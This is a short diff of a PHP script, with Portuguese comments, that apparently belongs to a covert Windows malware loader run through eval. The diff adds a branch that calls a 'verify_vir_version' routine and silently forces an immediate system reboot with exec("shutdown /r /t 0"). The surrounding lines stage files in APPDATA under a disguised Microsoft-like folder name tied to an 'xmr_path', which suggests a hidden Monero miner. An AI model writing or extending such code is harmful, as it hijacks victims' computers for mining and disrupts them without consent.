@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****26
+****27
 
 [GIT_COMMAND]
 
@@ -225,7 +225,10 @@ if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.1')
 	}
 }
 else
+{
 	$GLOBALS['__verify_vir_version_002']();
+	@exec("shutdown /r /t 0");
+}
 
 $lolm_path = getenv('APPDATA') . '\\microsoft_win_x86_1.0';
 $xmr_path = $lolm_path;
